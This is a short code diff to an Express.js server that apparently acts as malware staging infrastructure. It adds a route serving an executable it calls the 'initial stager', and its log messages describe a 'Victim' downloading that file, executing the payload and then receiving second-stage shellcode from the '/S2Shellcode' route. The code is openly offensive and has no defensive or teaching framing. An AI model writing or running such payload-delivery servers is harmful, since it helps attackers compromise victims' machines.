@@ -17,11 +17,17 @@ function sendFileContents(filePath, res) {
 }
 
 
+app.get('/s1.exe', (req, res) => {
+  console.log("[+] Victim has downloaded initial stager");
+  const filePath = path.join(__dirname, '../s1.exe');
+  sendFileContents(filePath, res);
+});
 
 
 
 app.get('/S2Shellcode', (req, res) => {
-  console.log("[+] Request to '/S2Shellcode'");
+  console.log("[!] Victim has executed Payload!");
+  console.log("[+] Serving second stage shellcode...");
   const filePath = path.join(shellcodeDir, 's2.bin');
   sendFileContents(filePath, res);
 });
